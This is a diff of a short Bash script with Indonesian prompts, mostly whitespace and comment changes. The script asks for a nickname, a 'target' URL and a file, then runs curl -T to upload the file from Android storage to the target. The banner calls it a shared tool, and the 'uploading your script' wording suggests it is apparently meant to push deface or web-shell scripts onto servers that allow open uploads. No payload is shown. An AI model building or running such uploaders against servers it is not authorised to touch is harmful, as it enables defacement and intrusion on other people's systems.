@@ -7,8 +7,8 @@ echo "                                                                          
 echo "                                                                               \\"
 echo "//////////////////////////////////////////////////////////////////////////////////////"
 
-   echo "selamat datang kaka,siapa nama kaka?" #tulisan keluar
- read nick #membaca tulisan masuk
+echo "selamat datang kaka,siapa nama kaka?" #tulisan keluar
+read nick #membaca tulisan masuk
  clear
  echo "##########"
   echo "##########         ini toool milik bersama                                                       ######"
@@ -23,9 +23,9 @@ echo "//////////////////////////////////////////////////////////////////////////
 echo "selamat datang di tools ini" $nick
 echo "tunggg bentarrr................."
 echo "masukkan target kamu : "
-read target #target
+read target 
 echo "input file kamu :"
-read file #file
+read file 
 echo "tunggu bentar ya tod w lagi apluod scrpit lu...."
 curl -T /storage/emulated/0/$file $target
 echo
